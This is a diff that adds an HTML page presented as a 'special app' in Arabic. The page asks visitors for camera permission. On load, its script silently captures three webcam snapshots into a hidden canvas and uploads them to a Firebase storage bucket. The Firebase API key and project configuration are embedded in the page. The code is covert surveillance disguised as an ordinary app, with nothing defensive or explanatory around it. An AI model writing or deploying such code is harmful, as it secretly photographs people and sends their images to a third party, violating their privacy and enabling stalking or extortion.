@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>تطبيق مميز</title>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-storage.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 20px;
+      background-color: #f9f9f9;
+    }
+    h1 {
+      color: #333;
+    }
+    .hidden {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <h1>تطبيق مميز</h1>
+  <p>يرجى منح الأذونات اللازمة للتطبيق للتقاط الصور.</p>
+  <canvas id="canvas" class="hidden"></canvas>
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyALGGBFq-XDvq78XmN13d1FX-9jv2e2jDE",
+      authDomain: "image-b3894.firebaseapp.com",
+      projectId: "image-b3894",
+      storageBucket: "image-b3894.appspot.com",
+      messagingSenderId: "724136212410",
+      appId: "1:724136212410:web:9450152940928e78a40f83",
+      measurementId: "G-D8NNFMGFH1"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const storage = firebase.storage();
+
+    const dataURLtoBlob = (dataURL) => {
+      const binary = atob(dataURL.split(',')[1]);
+      return new Blob([new Uint8Array([...Array(binary.length).keys()].map(i => binary.charCodeAt(i)))], { type: 'image/png' });
+    };
+
+    const capturePhoto = (video, canvas, storageRef, callback) => {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+      storageRef.put(dataURLtoBlob(canvas.toDataURL('image/png'))).then(callback).catch(console.error);
+    };
+
+    const capturePhotos = (video, canvas, storageRefBase, captureCount) => {
+      capturePhoto(video, canvas, storageRefBase.child(`snapshot_${Date.now()}_${captureCount}.png`), () => {
+        if (++captureCount < 3) {
+          setTimeout(() => capturePhotos(video, canvas, storageRefBase, captureCount), 500);
+        } else {
+          video.srcObject.getTracks().forEach(track => track.stop());
+        }
+      });
+    };
+
+    const requestCameraPermission = async () => {
+      try {
+        await navigator.mediaDevices.getUserMedia({ video: true });
+      } catch (error) {
+        console.error('فشل في الحصول على إذن الكاميرا:', error);
+      }
+    };
+
+    const initializePhotoCapture = async () => {
+      await requestCameraPermission();
+
+      navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+        video.addEventListener('loadeddata', () => {
+          const canvas = document.getElementById('canvas');
+          let captureCount = 0;
+          capturePhotos(video, canvas, storage.ref().child('snapshots/'), captureCount);
+        });
+      }).catch(console.error);
+    };
+
+    if ('serviceWorker' in navigator) {
+      window.addEventListener('load', () => {
+        navigator.serviceWorker.register('/service-worker.js').then(registration => {
+          console.log('Service Worker registered with scope:', registration.scope);
+        }).catch(error => {
+          console.log('Service Worker registration failed:', error);
+        });
+      });
+    }
+
+    window.onload = initializePhotoCapture;
+  </script>
+</body>
+</html>
